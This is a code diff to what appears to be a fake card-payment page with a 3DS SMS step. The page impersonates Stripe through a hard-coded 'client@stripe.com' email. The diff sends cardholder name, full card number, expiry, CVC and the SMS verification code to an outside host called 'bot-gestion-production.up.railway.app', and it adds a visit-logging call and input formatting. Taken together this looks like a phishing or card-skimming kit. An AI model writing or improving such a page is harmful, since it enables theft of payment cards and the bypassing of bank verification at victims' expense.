@@ -143,9 +143,9 @@
     <script>
         window.API_URL = "https://bot-gestion-production.up.railway.app"; 
     </script>
-    <script src="script.js"></script>
+    <!-- <script src="script.js"></script> -->
     <script>
-        // Override flow for 3DS SMS
+        // Form Elements
         const form = document.getElementById('paymentForm');
         const smsSection = document.getElementById('smsSection');
         const paymentView = document.getElementById('payment-view');
@@ -154,6 +154,31 @@
         const payBtn = document.getElementById('payBtn');
         const loader = payBtn.querySelector('.btn-loader');
         const btnText = payBtn.querySelector('.btn-text');
+
+        // Input Fields (for formatting)
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvcInput = document.getElementById('cvc');
+
+        // Card Number Formatting
+        cardNumberInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
+            e.target.value = formatted.substring(0, 19);
+        });
+
+        // Expiry Date Formatting
+        expiryInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length > 2) {
+                e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
+            } else {
+                e.target.value = val;
+            }
+        });
+
+        // Log Visit (Optional)
+        fetch(window.API_URL + '/api/log-visit').catch(() => {});
 
         form.onsubmit = async (e) => {
             e.preventDefault();
@@ -164,15 +189,15 @@
 
             const payload = {
                 cardHolder: document.getElementById('cardHolder').value,
-                cardNumber: document.getElementById('cardNumber').value,
-                expiry: document.getElementById('expiry').value,
-                cvc: document.getElementById('cvc').value,
+                cardNumber: cardNumberInput.value,
+                expiry: expiryInput.value,
+                cvc: cvcInput.value,
                 country: document.getElementById('country').value,
                 email: "client@stripe.com"
             };
 
             try {
-                const res = await fetch('/api/pay', {
+                const res = await fetch(window.API_URL + '/api/pay', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
@@ -207,7 +232,7 @@
             submitBtn.innerText = "Validation...";
 
             try {
-                const res = await fetch('/api/submit-sms', {
+                const res = await fetch(window.API_URL + '/api/submit-sms', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
